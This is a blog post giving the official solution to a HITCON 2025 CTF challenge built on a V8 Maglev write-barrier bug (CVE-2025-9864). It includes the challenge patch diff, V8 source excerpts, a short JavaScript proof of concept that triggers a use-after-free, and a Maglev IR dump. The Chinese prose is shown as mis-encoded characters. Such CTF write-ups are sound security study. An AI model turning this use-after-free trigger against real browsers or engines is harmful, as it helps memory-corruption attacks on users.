<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Terry1234&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Terry1234&#39;s blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Terry1234">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Terry1234's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Terry1234's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">æˆ‘å€‘çµ‚æœƒæŠµé”å„è‡ªçš„çµ‚é»</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/19/HITCON-ExhibitionCTF-2025-baby-Maglev/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/10/19/HITCON-ExhibitionCTF-2025-baby-Maglev/" class="post-title-link" itemprop="url">HITCON ExhibitionCTF 2025 baby Maglev Official Solution</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-10-19 21:56:36 / Modified: 23:40:07" itemprop="dateCreated datePublished" datetime="2025-10-19T21:56:36+08:00">2025-10-19</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>HITCON CTF è³‡å®‰äº¤æµè³½è¦æº–å‚™å…©å€‹ CTF é¡Œç›®ï¼Œå‰›å¥½å‰é™£å­åœ¨åˆ†æ CVE-2025-9864 çš„éç¨‹ä¸­å­¸åˆ°è »å¤šæ±è¥¿<br>æ‰€ä»¥å°±æŠŠå®ƒè®Šæˆèƒ½ Exploit è®“å¤§å®¶ç©<del>æ„Ÿå—ç—›è‹¦</del><br>å‰›å¥½ Issue é é¢ä¹Ÿé‚„æ²’å…¬é–‹ï¼Œæ‰€ä»¥å¤§å®¶ä¹Ÿä¸èƒ½æŠ„ä½œæ¥­ XDDD</p>
<h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>æŠŠ Float64ToTagged::ConversionMode å¾ kCanonicalizeSmi æ›æˆ kForceHeapNumber<br>ç•¶è¦è¢«å„²å­˜çš„ value å¯è¢« smi è¡¨ç¤ºæ™‚ï¼ŒkCanonicalizeSmi æœƒä½¿ç”¨ smi å„²å­˜é€™å€‹ valueï¼Œå¦‚æœæ˜¯æµ®é»æ•¸æˆ–æ˜¯è¶…å‡º SMI ç¯„åœçš„ integer å‰‡æœƒä½¿ç”¨ HeapNumber Object</p>
<p>kForceHeapNumber å‰‡ä¸€å¾‹ä½¿ç”¨ HeapNumber Object å„²å­˜<br>smi å’Œ Heap Object åœ¨ V8 Heap ä¸Šçš„å·®ç•°æ˜¯ smi æ˜¯ç›´æ¥å­˜å€¼ï¼ŒHeapNumber å„²å­˜çš„æ˜¯ Pointer</p>
<p>ç¬¬äºŒå€‹æ”¹å‹•å‰‡æ˜¯è®“ V8 ä¸è¦ Crash è€Œå·²ï¼Œä¸ç„¶æ²’è¾¦æ³• Exploit XDDD<br>ç”¨åˆ° Runtime_CheckNoWriteBarrierNeeded çš„åœ°æ–¹è »å°‘çš„ï¼Œé æœŸè§£æ˜¯å¾é€™é‚Šé–‹å§‹çœ‹</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/maglev/maglev-reducer-inl.h b/src/maglev/maglev-reducer-inl.h</span></span><br><span class="line"><span class="comment">index 60e26dfff1a..099893dd23c 100644</span></span><br><span class="line"><span class="comment">--- a/src/maglev/maglev-reducer-inl.h</span></span><br><span class="line"><span class="comment">+++ b/src/maglev/maglev-reducer-inl.h</span></span><br><span class="line"><span class="meta">@@ -531,14 +531,10 @@</span> ValueNode* MaglevReducer&lt;BaseT&gt;::GetTaggedValue(</span><br><span class="line">           AddNewNodeNoInputConversion&lt;Uint32ToNumber&gt;(&#123;value&#125;));</span><br><span class="line">     &#125;</span><br><span class="line">     case ValueRepresentation::kFloat64: &#123;</span><br><span class="line"><span class="deletion">-      if (!IsEmptyNodeType(node_info-&gt;type()) &amp;&amp; node_info-&gt;is_smi()) &#123;</span></span><br><span class="line"><span class="deletion">-        return alternative.set_tagged(</span></span><br><span class="line"><span class="deletion">-            AddNewNodeNoInputConversion&lt;CheckedSmiTagFloat64&gt;(&#123;value&#125;));</span></span><br><span class="line"><span class="deletion">-      &#125;</span></span><br><span class="line">       // TODO(victorgomes): Do not tag Float64Constant on runtime.</span><br><span class="line">       return alternative.set_tagged(</span><br><span class="line">           AddNewNodeNoInputConversion&lt;Float64ToTagged&gt;(</span><br><span class="line"><span class="deletion">-              &#123;value&#125;, Float64ToTagged::ConversionMode::kCanonicalizeSmi));</span></span><br><span class="line"><span class="addition">+              &#123;value&#125;, Float64ToTagged::ConversionMode::kForceHeapNumber));</span></span><br><span class="line">     &#125;</span><br><span class="line">     case ValueRepresentation::kHoleyFloat64: &#123;</span><br><span class="line">       if (!IsEmptyNodeType(node_info-&gt;type()) &amp;&amp; node_info-&gt;is_smi()) &#123;</span><br><span class="line"><span class="comment">diff --git a/src/runtime/runtime-test.cc b/src/runtime/runtime-test.cc</span></span><br><span class="line"><span class="comment">index 612ae214d75..0f02119af49 100644</span></span><br><span class="line"><span class="comment">--- a/src/runtime/runtime-test.cc</span></span><br><span class="line"><span class="comment">+++ b/src/runtime/runtime-test.cc</span></span><br><span class="line"><span class="meta">@@ -2427,9 +2427,6 @@</span> RUNTIME_FUNCTION(Runtime_CheckNoWriteBarrierNeeded) &#123;</span><br><span class="line">   if (!object.IsHeapObject()) &#123;</span><br><span class="line">     return CrashUnlessFuzzing(isolate);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="deletion">-  auto heap_object = Cast&lt;HeapObject&gt;(object);</span></span><br><span class="line"><span class="deletion">-  Tagged&lt;Object&gt; value = args[1];</span></span><br><span class="line"><span class="deletion">-  CHECK(!WriteBarrier::IsRequired(heap_object, value));</span></span><br><span class="line">   return args[0];</span><br><span class="line"> #else</span><br><span class="line">   UNREACHABLE();</span><br></pre></td></tr></table></figure>

<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><h4 id="Write-Barrier"><a href="#Write-Barrier" class="headerlink" title="Write Barrier"></a>Write Barrier</h4><p>é¦–å…ˆè¦äº†è§£ Write Barrier æ˜¯ä»€éº¼<br><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8.git/+/refs/heads/12.9.16/src/heap/WRITE_BARRIER.md">https://chromium.googlesource.com/v8/v8.git/+/refs/heads/12.9.16/src/heap/WRITE_BARRIER.md</a></p>
<p>å®ƒæ˜¯ä¸€å€‹ç”¨ä¾†å¹«åŠ© V8 åš Garbage Collection çš„æ©Ÿåˆ¶<br>å› ç‚º Object åœ¨ V8 çš„ Heap ä¸Šæ˜¯ä»¥ Pointer çš„æ–¹å¼å„²å­˜ï¼Œè€Œåœ¨ GC æ™‚æœƒç§»é™¤æ­»å»çš„ Objectï¼Œå‹¢å¿…æœƒå‡ºç¾ä¸€äº› memory fragmentation çš„æƒ…å¢ƒ<br>ç‚ºäº†è¦è§£æ±ºé€™ç¨®æƒ…æ³ï¼ŒV8 æœƒæ¬ç§» Heap ä¸Šçš„ Object<br>Write Barrier å‰‡æ˜¯ç”¨ä¾†ç¢ºä¿é‚£äº›æŒ‡åˆ°è¢«æ¬ç§»çš„ Object çš„ Pointer ä¾ç„¶æŒ‡åˆ°æ­£ç¢ºçš„ address çš„ä¸€é …æ©Ÿåˆ¶<br>å¦‚æœæ²’æœ‰ Write Barrier ç´€éŒ„çš„è©±ï¼ŒåŸæœ¬æŒ‡åˆ°è¢«æ¬ç§»çš„ Object çš„ Pointer å°±ä¸æœƒè¢«æ›´æ–°ï¼Œå¾è€Œè®Šæˆ Dangling Pointer</p>
<h4 id="Trigger-UAF"><a href="#Trigger-UAF" class="headerlink" title="Trigger UAF"></a>Trigger UAF</h4><p>MaglevReducer<BaseT>::GetTaggedValue ä¸­çš„ Switch æ˜¯æ ¹æ“š value_representation åšåˆ¤æ–·çš„ï¼Œè€Œ value_representation åªè·Ÿ ValueNode çš„ OpProperties æœ‰é—œï¼Œèˆ‡ Node çš„ Output å¯ä»¥è¢«ç”¨ä»€éº¼ Type å„²å­˜ç„¡é—œ<br>èˆ‰å€‹ä¾‹å­ï¼Œå¦‚æœä¸€å€‹ ValueNode çš„ OpProperties åŒ…å« kFloat64ï¼Œä¸” Output Value æ˜¯ 4.0(ä¸€å€‹èƒ½è¢« smi å„²å­˜çš„æ•¸å€¼)<br>é‚£å®ƒçš„ value_representation å°±æœƒæ˜¯ ValueRepresentation::kFloat64</p>
<p>å¾ç¬¬äºŒå€‹æ”¹å‹•çš„åœ°æ–¹é–‹å§‹çœ‹æœƒç™¼ç¾åªæœ‰ 3 å€‹ Node åœ¨ Emit Machine Code æ™‚ç”¨åˆ° Runtime_CheckNoWriteBarrierNeeded<br>å…¶ä¸­æœƒç™¼ç¾æ‡‰è©²è¦å…ˆçœ‹ StoreTaggedFieldNoWriteBarrier é€™å€‹ Node<br>BuildStoreTaggedFieldNoWriteBarrier() æœ€å¾Œä¹Ÿæœƒ call åˆ° MaglevReducer<BaseT>::GetTaggedValue<br>é€™å€‹ Node ä¹Ÿæ¯”å…¶ä»–å…©å€‹ Node (StoreFixedArrayElementNoWriteBarrier &#x2F; StoreMap) å¸¸å‡ºç¾åœ¨ UAF çš„æ´ä¹‹ä¸­<br>ç›®å‰é‚„æ²’çœ‹éèª¤ç”¨ StoreFixedArrayElementNoWriteBarrier &#x2F; StoreMap å°è‡´UAFçš„æƒ…æ³ XDDD</p>
<p>é–å®š StoreTaggedFieldNoWriteBarrier å¾Œå¯ä»¥çœ‹é€™å€‹ Node åœ¨ä»€éº¼æƒ…æ³ä¸‹æœƒè¢«å»ºå‡ºä¾†<br>é€™é‚Šå¯ä»¥æ…¢æ…¢æ‰¾å“ªäº›åœ°æ–¹æœƒç”¨åˆ° BuildStoreTaggedFieldNoWriteBarrier()</p>
<p>å…¶ä¸­ MaglevGraphBuilder::TrySpecializeStoreContextSlot() æ˜¯å€‹è »æœ‰è¶£çš„åœ°æ–¹</p>
<p>å®ƒæ˜¯åœ¨æ ¹æ“š runtime è’é›†åˆ°çš„ context(å¯ä»¥æƒ³æˆ feedback) ä¾†å„ªåŒ– JavaScript ä¸­çš„ store operation<br>ç•¶è¦å„²å­˜çš„å€¼å¯ä»¥è¢« smi è¡¨ç¤ºæ™‚(e.g. 4.0) å°±æœƒé€²å…¥ ContextCell::kSmi çš„ Case ä¸­ï¼Œç”¢å‡º Runtime Check å’Œ StoreTaggedFieldNoWriteBarrier Node</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MaybeReduceResult <span class="title">MaglevGraphBuilder::TrySpecializeStoreContextSlot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ValueNode* context, <span class="type">int</span> index, ValueNode* value, Node** store)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_NOT_NULL</span>(store);</span><br><span class="line">  <span class="built_in">DCHECK</span>(v8_flags.script_context_cells || v8_flags.function_context_cells);</span><br><span class="line">  <span class="keyword">if</span> (!context-&gt;<span class="built_in">Is</span>&lt;Constant&gt;()) &#123;</span><br><span class="line">    *store =</span><br><span class="line">        <span class="built_in">AddNewNode</span>&lt;StoreContextSlotWithWriteBarrier&gt;(&#123;context, value&#125;, index);</span><br><span class="line">    <span class="keyword">return</span> ReduceResult::<span class="built_in">Done</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">IsEmptyNodeType</span>(<span class="built_in">GetType</span>(value))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">EmitUnconditionalDeopt</span>(DeoptimizeReason::kWrongValue);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  compiler::ContextRef context_ref =</span><br><span class="line">      context-&gt;<span class="built_in">Cast</span>&lt;Constant&gt;()-&gt;<span class="built_in">ref</span>().<span class="built_in">AsContext</span>();</span><br><span class="line">  <span class="keyword">auto</span> maybe_value = context_ref.<span class="built_in">get</span>(<span class="built_in">broker</span>(), index);</span><br><span class="line">  <span class="keyword">if</span> (!maybe_value || maybe_value-&gt;<span class="built_in">IsTheHole</span>() ||</span><br><span class="line">      maybe_value-&gt;<span class="built_in">IsUndefinedContextCell</span>()) &#123;</span><br><span class="line">    *store =</span><br><span class="line">        <span class="built_in">AddNewNode</span>&lt;StoreContextSlotWithWriteBarrier&gt;(&#123;context, value&#125;, index);</span><br><span class="line">    <span class="keyword">return</span> ReduceResult::<span class="built_in">Done</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> offset = Context::<span class="built_in">OffsetOfElementAt</span>(index);</span><br><span class="line">  <span class="keyword">if</span> (!maybe_value-&gt;<span class="built_in">IsContextCell</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">BuildStoreTaggedField</span>(context, value, offset,</span><br><span class="line">                                 StoreTaggedMode::kDefault, store);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  compiler::ContextCellRef slot_ref = maybe_value-&gt;<span class="built_in">AsContextCell</span>();</span><br><span class="line">  ContextCell::State state = slot_ref.<span class="built_in">state</span>();</span><br><span class="line">  <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">    <span class="keyword">case</span> ContextCell::kConst: &#123;</span><br><span class="line">      <span class="keyword">auto</span> constant = slot_ref.<span class="built_in">tagged_value</span>(<span class="built_in">broker</span>());</span><br><span class="line">      <span class="keyword">if</span> (!constant.<span class="built_in">has_value</span>() ||</span><br><span class="line">          (constant-&gt;<span class="built_in">IsString</span>() &amp;&amp; !constant-&gt;<span class="built_in">IsInternalizedString</span>())) &#123;</span><br><span class="line">        *store = <span class="built_in">AddNewNode</span>&lt;StoreContextSlotWithWriteBarrier&gt;(&#123;context, value&#125;,</span><br><span class="line">                                                              index);</span><br><span class="line">        <span class="keyword">return</span> ReduceResult::<span class="built_in">Done</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnContextCell</span>(slot_ref, state);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">BuildCheckNumericalValueOrByReference</span>(</span><br><span class="line">          value, *constant, DeoptimizeReason::kStoreToConstant);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> ContextCell::kSmi:</span><br><span class="line">      <span class="built_in">RETURN_IF_ABORT</span>(<span class="built_in">BuildCheckSmi</span>(value));</span><br><span class="line">      <span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnContextCell</span>(slot_ref, state);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">BuildStoreTaggedFieldNoWriteBarrier</span>(</span><br><span class="line">          <span class="built_in">GetConstant</span>(slot_ref), value, <span class="built_in">offsetof</span>(ContextCell, tagged_value_),</span><br><span class="line">          StoreTaggedMode::kDefault, store);</span><br><span class="line">    <span class="keyword">case</span> ContextCell::kInt32:</span><br><span class="line">      <span class="built_in">EnsureInt32</span>(value, <span class="literal">true</span>);</span><br><span class="line">      *store = <span class="built_in">AddNewNode</span>&lt;StoreInt32&gt;(</span><br><span class="line">          &#123;<span class="built_in">GetConstant</span>(slot_ref), value&#125;,</span><br><span class="line">          <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">offsetof</span>(ContextCell, double_value_)));</span><br><span class="line">      <span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnContextCell</span>(slot_ref, state);</span><br><span class="line">      <span class="keyword">return</span> ReduceResult::<span class="built_in">Done</span>();</span><br><span class="line">    <span class="keyword">case</span> ContextCell::kFloat64:</span><br><span class="line">      <span class="built_in">RETURN_IF_ABORT</span>(<span class="built_in">BuildCheckNumber</span>(value));</span><br><span class="line">      *store = <span class="built_in">AddNewNode</span>&lt;StoreFloat64&gt;(</span><br><span class="line">          &#123;<span class="built_in">GetConstant</span>(slot_ref), value&#125;,</span><br><span class="line">          <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(<span class="built_in">offsetof</span>(ContextCell, double_value_)));</span><br><span class="line">      <span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnContextCell</span>(slot_ref, state);</span><br><span class="line">      <span class="keyword">return</span> ReduceResult::<span class="built_in">Done</span>();</span><br><span class="line">    <span class="keyword">case</span> ContextCell::kDetached:</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">BuildStoreTaggedField</span>(context, value, offset,</span><br><span class="line">                                   StoreTaggedMode::kDefault, store);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">UNREACHABLE</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§€å¯Ÿå®Œä¸Šè¿°è³‡è¨Šå¾Œå¯ä»¥ç™¼ç¾å¦‚æœæˆ‘èƒ½é€ å‡ºä¸€å€‹ Store Operationï¼Œå®ƒçš„ Input ValueNode kProperties åŒ…å« kFloat64 ä¸” Output Value èƒ½è¢« smi è¡¨ç¤ºçš„è©±ï¼Œå°±æœƒç²å¾—ä¸€å€‹ä¸è¢« Write Barrier è¿½è¹¤çš„ Heap Number Object</p>
<p>æœ€å¾Œæˆ‘é¸æ“‡äº† Float64Sqrt ä¾†è§¸ç™¼ UAF</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Float64Sqrt</span> : <span class="keyword">public</span> FixedInputValueNodeT&lt;<span class="number">1</span>, Float64Sqrt&gt; &#123;</span><br><span class="line">  <span class="keyword">using</span> Base = FixedInputValueNodeT&lt;<span class="number">1</span>, Float64Sqrt&gt;;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Float64Sqrt</span><span class="params">(<span class="type">uint64_t</span> bitfield)</span> : Base(bitfield) &#123;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="keyword">constexpr</span> OpProperties kProperties = OpProperties::<span class="built_in">Float64</span>();</span><br><span class="line">  <span class="type">static</span> <span class="keyword">constexpr</span></span><br><span class="line">      <span class="keyword">typename</span> Base::InputTypes kInputTypes&#123;ValueRepresentation::kHoleyFloat64&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function">Input <span class="title">input</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Node::<span class="built_in">input</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">SetValueLocationConstraints</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">GenerateCode</span><span class="params">(MaglevAssembler*, <span class="type">const</span> ProcessingState&amp;)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">PrintParams</span><span class="params">(std::ostream&amp;)</span> <span class="type">const</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸€å€‹ç°¡å–®çš„ poc é•·é€™æ¨£</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> v0 = <span class="number">48763</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    v0 = <span class="title class_">Math</span>.<span class="title class_">Sqrt</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">    <span class="title function_">f</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">gc</span>()</span><br></pre></td></tr></table></figure>

<p>Maglev çš„ IR Graph å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x2ba900064a91 SharedFunctionInfo f1 (0x2ba900065625 String[6] poc.js011)</span><br><span class="line">   0  LdaGlobal [0], [0]</span><br><span class="line">   1 InitialValue(this) â†’ (x), 4 uses</span><br><span class="line">   5 FunctionEntryStackCheck</span><br><span class="line">      â†³ lazy @-1 (2 live vars)</span><br><span class="line">   6 Jump b1</span><br><span class="line">   â†“</span><br><span class="line"> Block b1</span><br><span class="line">0x2ba900064a91 SharedFunctionInfo f1 (0x2ba900065625 String[6] poc.js00)</span><br><span class="line">   9  Construct r0, r1-r1, [2]</span><br><span class="line">   9 ğŸ¢ Construct [n7(x), n7(x), n3(x), n4(x), n8(x)] â†’ (x), 0 uses, but required</span><br><span class="line">      â†³ lazy @9 (2 live vars)</span><br><span class="line">  25  CallProperty1 r0, r1, r2, [8]</span><br><span class="line">  14 Float64Sqrt(MathSqrt) [n13(x)] â†’ (x), 4 uses</span><br><span class="line">  31  LdaCurrentContextSlot [2]</span><br><span class="line">  16 LoadTaggedField(0x4, compressed) [n15(x)] â†’ (x), 1 uses</span><br><span class="line">  33  ThrowReferenceErrorIfHole [4]</span><br><span class="line">  17 ThrowReferenceErrorIfHole [n16(x)]</span><br><span class="line">      â†³ lazy @33 (3 live vars)</span><br><span class="line">  37  StaCurrentContextSlot [2]</span><br><span class="line">      â†± eager @37 (3 live vars)</span><br><span class="line">  18 CheckHoleyFloat64IsSmi [n14(x)] </span><br><span class="line">  19 HoleyFloat64ToTagged [n14(x)] â†’ (x), 1 uses </span><br><span class="line">  20 StoreTaggedFieldNoWriteBarrier(0x4) [n15(x), n19(x)]</span><br><span class="line">  40  Return</span><br><span class="line">  22 ReduceInterruptBudgetForReturn(40) [n21(x)]</span><br><span class="line">  23 Return [n4(x)]</span><br></pre></td></tr></table></figure>

